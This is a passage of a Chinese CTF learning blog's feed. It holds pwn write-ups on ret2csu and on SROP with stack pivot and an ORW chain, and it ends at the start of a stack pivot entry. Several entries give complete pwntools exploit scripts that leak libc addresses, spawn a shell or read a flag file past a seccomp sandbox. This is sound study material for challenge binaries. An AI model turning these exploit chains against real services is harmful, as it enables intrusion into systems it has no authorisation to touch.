class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑依旧十分简单，保护只有<code>NX</code>，非常轻松便能覆盖返回地址，缓冲区也量大管饱，而gadget便是我们的<code>libc_csu_init</code></p><p>第一步还是先泄露我们的libc基址</p><p>要注意的是:gadget1的地址就在gadget2后面，所以gadget1要执行两次(到ret才结束!)，不过第二次对我们rop链产生影响的只有<code>add rsp, 0x38</code>罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span>   <span class="hljs-comment">#填充</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#对齐rsp</span><br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#rbx设置为0</span><br>payload1 += p64(<span class="hljs-number">1</span>)     <span class="hljs-comment">#注意:rbp必须设置为1，否则将进入循环，详情自己看汇编...</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)   <span class="hljs-comment">#注意是call qword ptr [r12+rbx*8]，所以写write_got而不是write_plt</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)   <br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span>  <span class="hljs-comment">#注意神秘的add rsp,0x38</span><br>payload1 += p64(main_addr)  <span class="hljs-comment">#回到main函数...</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br></code></pre></td></tr></table></figure><p>然后接收并计算关键地址…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p>接下来，我们把字符串<code>/bin/sh</code>和<code>system</code>的真实地址写到bss段上</p><p>第二阶段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这样，我们将rdi设置为<code>/bin/sh</code>所在的地址，并将r12设置为system所在的地址，即可实现<code>call system</code>并获得shell</p><p>最终阶段:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br></code></pre></td></tr></table></figure><p>最后也是拿到shell啦~</p><p>你也来试试吧!</p><p>感谢阅读…</p><p>最后还是贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>main_addr = <span class="hljs-number">0x400564</span><br>bss_addr = <span class="hljs-number">0x601028</span><br>gadget1 = <span class="hljs-number">0x400606</span><br>gadget2 = <span class="hljs-number">0x4005f0</span><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)<br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span><br>payload1 += p64(main_addr)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br><br>sleep(<span class="hljs-number">1</span>)<br><br>leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ps:千万别说我偷懒…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2csu</tag>
      
      <tag>gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello pwn!</title>
    <link href="/2025/12/25/hello-pwn/"/>
    <url>/2025/12/25/hello-pwn/</url>
    
    <content type="html"><![CDATA[<p>用此博客来记录我在<code>pwn</code>学习过程中的一些题解与思考</p><p>希望你能有所收获…</p><p>modification:</p><p>于2026.1.1</p><p>不止于pwn</p><p>move forward!</p><p>patience is key in life…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello,World!</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2025/12/25/SROP/"/>
    <url>/2025/12/25/SROP/</url>
    
    <content type="html"><![CDATA[<p>建议先看stack pivot再来这里…</p><p>ok题目来自XSWCTF2025初赛的一道<code>pwn</code>，考察了更加精妙的栈风水布局(基于stack pivot)，同时融合着SROP和ORW，来看看吧!</p><p>先看一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_78 [<span class="hljs-number">108</span>];<br>  undefined4 local_c;<br>  <br>  local_c = <span class="hljs-number">0</span>;<br>  setbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hey hey what are you doing here?&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x50</span>);   #第一次read，没有溢出<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I say STOP doing this!&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x200</span>);  #第二次read，存在溢出<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>保护虽然只有<code>NX</code>，但是同时开启了<code>seccomp</code>沙箱(sandbox)，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><p>查看，发现禁用了<code>execve</code>，所以只能打ORW(open,read,write)，让我们找找关于寄存器的gadget，额，竟然什么都找不到…</p><p>但是我们找到了一个<code>syscall</code>的汇编指令，所以在这种情况下，我们就要使用一招系统内核级的利用，<code>SROP</code>，linux存在一种信号处理机制，当进程收到信号时，内核会先暂停进程执行，然后保存当前寄存器状态到用户栈(sigcontext)，接下来跳转到信号处理函数，等信号处理函数执行完毕后，调用<code>sigreturn</code>系统调用，内核从栈上恢复寄存器状态，因此，我们可以伪造sigcontext结构，同时设置<code>rax</code>为<code>sigreturn</code>的系统调用号<code>15</code>(x86-64)，并执行<code>syscall</code>指令触发<code>sigreturn</code>机制，内核便会从我们伪造的<code>sigcontext</code>中恢复所有我们所设定的寄存器值，从而完全控制进程执行流!</p><p>然而还有一个关键点在于如何将rax设置为15，因为并没有<code>pop rax; ret;</code>的gadget，这时，”不难”想到，rax寄存器上保存的是函数的返回值，我们可以在read时读入15个字节长度的数据，此时rax便被巧妙地设置为了15，此时再执行syscall即可调用sigreturn机制打我们的<code>SROP</code>了</p><p>当然，为了不破坏栈的结构，我们仍然需要利用<code>stack pivot</code>迁移至bss段上伪造我们的栈帧并布局我们的利用链…</p><p>先把有用的地址列出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read = <span class="hljs-number">0x4012a9</span>    <span class="hljs-comment">#对应执行我们的第二次read的地址</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span>    <span class="hljs-comment">#栈迁移的关键</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span>  <span class="hljs-comment">#0x404590(布局的地方)</span><br></code></pre></td></tr></table></figure><p>第一次的read直接跳过，来到我们的第二次read，首先将<code>rbp</code>迁移至bss段，并重新执行一次read(想必都会了吧)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br></code></pre></td></tr></table></figure><p>这时在bss段上形成了新的栈帧，我们步骤好srop的<code>sigcontext</code>以泄露libc基址，并进行第二次段内迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)   <br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss - <span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss - <span class="hljs-number">0x60</span> + <span class="hljs-number">8</span><br>frame3.rbp = bss + <span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br></code></pre></td></tr></table></figure><p>发送完这次payload后再次执行<code>read</code>，我们发送15字节长度的数据以将<code>rax</code>设置为15，同时注意，此时经过我们的布置，<code>rbp</code>目前在<code>0x4045a0</code>的位置，刚好新栈帧<code>rip</code>返回地址的位置便是我们的<code>syscall</code>和<code>sigcontext</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>这次便会真正执行到我们的sigcontext中所设置的寄存器，即，泄露puts真实地址，从而得到libc基址，继而得到open,read,write和所需gadget的地址，而<code>rbp</code>被设置到更上方的地址再次布局我们最后的<code>ORW</code>，<code>rsp</code>设置在了我们先前<code>read</code>指令的所在地，因此，进行最后一次read，直接布置最终的rop链…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)  <span class="hljs-comment">#bss+0x210就是flag字符串的地址!</span><br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)  <span class="hljs-comment">#3为fd,rsi随便放哪里好了...</span><br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)  <span class="hljs-comment">#将flag写到stdout，注意对齐...</span><br></code></pre></td></tr></table></figure><p>最终，在精妙的布局与利用下，我们成功获得了flag…</p><p>由于迷失于错综的地址，当时我也是对着<code>gdb</code>调试了老半天才算看懂这道题的wp，写出来过程也算了却一下自己的心魔，依旧贴一张图帮助你思考…</p><p><img src="/images/5.png" alt="内存布局"></p><p>最后贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">40315</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>read = <span class="hljs-number">0x4012a9</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><br>p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)<br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss-<span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss-<span class="hljs-number">0x60</span>+<span class="hljs-number">8</span><br>frame3.rbp = bss+<span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)<br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)<br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)<br><br>p.send(payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>就到这里便结束了，感谢阅读，生活愉快…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SROP</tag>
      
      <tag>栈迁移</tag>
      
      <tag>ret2libc</tag>
      
      <tag>ORW</tag>
      
      <tag>寄存器</tag>
      
      <tag>内存布局</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stack pivot</title>
    <link href="/2025/12/25/stack-pivot/"/>
    <url>/2025/12/25/stack-pivot/</url>
    
    <content type="html"><![CDATA[<p>题目出自哪里已经记不真切了</p><p>只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下</p><p>来看看吧!</p><p>题目逻辑非常之简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目的保护只有<code>NX</code></p><p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p><p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved 